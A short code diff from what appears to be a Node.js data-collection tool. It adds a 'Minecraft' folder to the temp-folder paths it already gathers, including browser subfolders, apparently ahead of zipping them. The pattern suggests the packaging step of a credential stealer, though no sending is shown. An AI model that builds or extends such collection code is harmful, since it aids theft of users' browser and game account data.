@@ -4,7 +4,7 @@ const moment = require('moment');
 const fs = require('fs');
 const { generateZipFromFiles } = require('../zip');
 
-const paths = [tempFolder, join(tempFolder, 'Browsers')];
+const paths = [tempFolder, join(tempFolder, 'Browsers'), join(tempFolder, 'Minecraft')];
 fs.readdirSync(join(tempFolder, 'Browsers')).forEach((folder) => paths.push(join(tempFolder, 'Browsers', folder)));
 
 const files = fs.readdirSync(tempFolder).filter(file => file.split('.').length > 1);
